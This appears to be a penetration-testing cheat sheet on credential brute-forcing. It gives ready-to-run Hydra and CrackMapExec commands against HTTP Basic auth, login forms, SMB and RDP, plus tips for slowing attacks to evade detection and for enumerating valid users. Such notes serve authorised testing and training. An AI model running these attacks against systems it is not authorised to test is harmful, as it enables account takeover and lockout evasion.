Brute-force attacks involve systematically guessing login credentials using **wordlists** and **automated tools**. If rate limiting or account lockout is not implemented, brute-forcing can lead to full account takeover.

## Identifying Authentication Mechanism

Before brute-forcing, determine the type of authentication used:

1. **Form-Based Authentication**
    - Uses `username` and `password` fields in an HTML form.
    - Typically sends HTTP `POST` requests for login.
    
2. **Basic/Digest Authentication**
    - Sends credentials via `Authorization: Basic <Base64-encoded credentials>` in HTTP headers.
    - Often used for web servers and API endpoints.
    
3. **Token-Based Authentication (JWT, OAuth, API Keys)**
    - Uses tokens for authentication instead of passwords.
    - Often found in modern API authentication mechanisms.

## Brute-Forcing Login Credentials

### Hydra

#### HTTP Basic Authentication

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 192.168.177.90 http-get
```

#### HTTP POST Form Brute-Force

```
hydra -L users.txt -P passwords.txt $IP http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

- `-L users.txt` → Uses a list of usernames.
- `-P passwords.txt` → Uses a list of passwords
- `:F=incorrect` → Defines a failed login message to filter incorrect attempts.

#### SMB Brute-Force

```
hydra -L users.txt -P passwords.txt smb://192.168.1.10
```

### CrackMapExec

#### Brute-Forcing Web Authentication

```
crackmapexec http <target-ip> -u users.txt -p passwords.txt --auth-form /login.php
```

- `-u users.txt` → Usernames list.
- `-p passwords.txt` → Passwords list.
- `--auth-form /login.php` → Targets a login form for brute-force attempts.

#### SMB Brute-Forcing
```
crackmapexec smb <target-ip> -u users.txt -p passwords.txt
```


#### RDP Brute-Forcing
```
crackmapexec rdp <target-ip> -u users.txt -p passwords.txt
```

## Preventing Account Lockout

- **Use a slow attack rate**: Adding delays between requests reduces detection.
- **Monitor response messages**: Some applications return different error messages for valid vs. invalid users.